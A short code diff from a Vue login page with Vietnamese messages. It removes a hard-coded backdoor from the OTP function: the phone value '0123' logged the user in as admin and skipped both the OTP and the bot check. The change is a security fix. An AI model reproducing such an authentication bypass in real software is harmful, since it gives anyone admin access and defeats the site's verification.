@@ -199,14 +199,6 @@ const isValidVietnamesePhone = (p) => {
 const sendOtp = async () => {
   const formattedPhone = phone.value?.trim()
 
-  if (formattedPhone === '0123') {
-    isLoading.value = true
-    await login('Admin 0123')
-    router.push('/admin')
-    isLoading.value = false
-    return
-  }
-
   if (!formattedPhone || !turnstileToken.value) {
     errorMsg.value = 'Vui lòng xác thực bạn không phải robot.'
     return
